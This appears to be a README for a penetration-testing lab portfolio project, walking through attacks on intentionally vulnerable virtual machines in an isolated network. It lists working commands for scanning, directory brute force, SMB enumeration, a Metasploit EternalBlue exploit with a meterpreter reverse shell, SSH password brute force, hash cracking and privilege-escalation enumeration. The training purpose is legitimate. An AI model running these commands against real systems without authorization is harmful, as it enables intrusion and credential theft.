
# Kali Linux Attack Simulation & Red Team Lab

## Overview

This project simulates a controlled offensive security environment using Kali Linux to perform structured attack scenarios against intentionally vulnerable virtual machines.

The purpose is to demonstrate practical red team skills including reconnaissance, vulnerability assessment, exploitation, privilege escalation, and post-exploitation analysis within a legal lab environment.

All activities are performed in an isolated virtual network for educational and professional cybersecurity development.

---

## Objectives

- Build a controlled penetration testing lab environment
- Perform reconnaissance and network enumeration
- Identify system and application vulnerabilities
- Execute controlled exploitation techniques
- Perform privilege escalation analysis
- Simulate post-exploitation activity
- Document attack paths and findings
- Improve offensive security and detection awareness

---

## Technologies Used

- Kali Linux
- Metasploit Framework
- Nmap
- Netcat
- Burp Suite
- Hydra
- John the Ripper
- Enum4linux
- Gobuster
- VirtualBox / VMware
- Vulnerable targets (Metasploitable2 / DVWA / Windows VM)

---

## Lab Architecture

```

Kali Linux (Attacker Machine)
│
▼
Isolated Virtual Network (Host-only / NAT Network)
│
┌──────┴────────┐
▼               ▼
Metasploitable2   Windows Vulnerable VM
(DVWA / Linux)    (Misconfigured Services)

````id="arch1"

---

## Attack Methodology

The lab follows a structured penetration testing workflow:

### 1. Reconnaissance
- Identify target IP range
- Discover active hosts
- Map network topology

### 2. Enumeration
- Service version detection
- Open port identification
- User and share enumeration

### 3. Vulnerability Analysis
- Identify outdated services
- Misconfigurations
- Weak authentication mechanisms

### 4. Exploitation
- Exploit known vulnerabilities
- Gain initial access
- Execute payloads

### 5. Privilege Escalation
- Kernel exploit analysis
- Misconfigured sudo permissions
- Credential reuse attacks

### 6. Post-Exploitation
- System enumeration
- Credential harvesting
- Persistence simulation (lab only)

---

## Reconnaissance Examples

### Network Scan

```bash
nmap -sS -sV -A 192.168.56.0/24
````

---

### Service Enumeration

```bash
nmap -p- -T4 192.168.56.101
```

---

## Vulnerability Scanning

### Directory Brute Force

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
```

---

### SMB Enumeration

```bash
enum4linux -a 192.168.56.101
```

---

## Exploitation (Metasploit)

### Launch Framework

```bash
msfconsole
```

### Example Exploit Flow

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.56.101
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.1
run
```

---

## Password Attacks

### SSH Brute Force (Lab Only)

```bash
hydra -l admin -P rockyou.txt ssh://192.168.56.101
```

---

### Hash Cracking

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

## Privilege Escalation

### Linux Enumeration

```bash
uname -a
sudo -l
find / -perm -4000 2>/dev/null
```

---

### Windows Enumeration

```powershell
whoami /priv
systeminfo
net user
```

---

## Post-Exploitation Activities

* Gather system information
* Identify additional network targets
* Extract credentials (lab only)
* Analyze installed services
* Document attack chain

---

## Attack Flow Summary

1. Target discovery via Nmap
2. Service enumeration and fingerprinting
3. Vulnerability identification
4. Exploitation via Metasploit or manual methods
5. Privilege escalation
6. System enumeration and reporting

---

## Defensive Insights (Blue Team Value)

This lab also helps identify how attacks are detected:

* Nmap scans detected via IDS rules
* Brute force attempts logged in authentication logs
* Exploit attempts visible in system event logs
* Meterpreter sessions detectable via network anomalies

---

## Skills Demonstrated

* Penetration Testing Methodology
* Network Reconnaissance
* Vulnerability Assessment
* Exploitation Techniques
* Privilege Escalation
* Linux & Windows Security Analysis
* Offensive Security Tooling
* Attack Path Documentation

---

## Ethical Disclaimer

This project is strictly for educational use in isolated lab environments.
No real-world systems, networks, or unauthorized targets are involved.

---

## Future Improvements

* Add Active Directory attack simulation (Kerberoasting, Pass-the-Hash)
* Integrate BloodHound for AD attack paths
* Add SIEM detection mapping (Splunk / Sentinel)
* Include MITRE ATT&CK technique tagging
* Automate attack scenarios with scripts
* Add defensive detection response mapping

---

## Repository Structure

```
kali-attack-lab/
│
├── README.md
├── scans/
├── exploits/
├── payloads/
├── screenshots/
├── wordlists/
├── reports/
└── notes/
```
## Summary

This project demonstrates structured offensive security operations using Kali Linux, focusing on reconnaissance, exploitation, privilege escalation, and attack path documentation in a controlled environment.

```
```
